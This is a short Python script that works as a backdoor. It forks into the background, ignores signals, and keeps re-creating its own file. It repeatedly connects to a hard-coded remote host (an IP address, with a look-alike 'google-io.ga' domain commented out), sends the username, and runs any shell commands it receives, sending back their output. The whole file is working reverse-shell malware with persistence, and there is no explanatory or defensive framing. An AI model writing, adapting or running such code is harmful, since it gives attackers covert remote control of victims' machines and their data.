#!/usr/bin/env python3

import socket
import time
import os
import re
import subprocess
import signal
import sys
import stat
import threading

USER = os.environ.get('USER', 'unknown')
BUFFER_SIZE = 1025
PORT = 8080
# DNS = 'google-io.ga'
DNS = '172.20.10.2'

SCRIPT_PATH = os.path.realpath(__file__)
SCRIPT_CONTENT = (open(SCRIPT_PATH, 'r')).read()

def listen_cmd(socket: socket.socket):
    cwd = os.getcwd()

    def exec_cmd(cmd):
        p = subprocess.Popen(cmd
                    , stdout=subprocess.PIPE
                    , stderr=subprocess.PIPE
                    , shell=True
                    , cwd=cwd)
        stdout, stderr = p.communicate()
        if stdout:
            socket.send(stdout)
        elif stderr:
            socket.send(stderr)
        else:
            socket.send(b'command done')

    while True:
        cmd = socket.recv(BUFFER_SIZE).decode()
        if re.search(r'^cd ', cmd):
            cwd = os.path.join(cwd, cmd[3:])
            socket.send(b'path changed')
        else:
            exec_cmd(cmd)

def connect_to_host():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((DNS, PORT))
            s.send(USER.encode())
            listen_cmd(s)
        except:
            time.sleep(1)

def persist_file():
    while True:
        if os.path.exists(SCRIPT_PATH):
            with open(SCRIPT_PATH, 'r') as file_r:
                if file_r.read() == SCRIPT_CONTENT:
                    time.sleep(1)
                    continue
        with open(SCRIPT_PATH, 'w') as file_w:
            file_w.write(SCRIPT_CONTENT)
            os.chmod(SCRIPT_PATH, 0o777)

def handle_signals():
    def noop(*_, **__):
        pass

    SIGNUMS = [x for x in dir(signal) if x.startswith('SIG')]
    for i in SIGNUMS:
        try:
            signum = getattr(signal, i)
            signal.signal(signum, noop)
        except:
            pass

def main():
    if os.fork() == 0:
        handle_signals()
        threading.Thread(target=persist_file).start()
        connect_to_host()

if __name__ == '__main__':
    main()
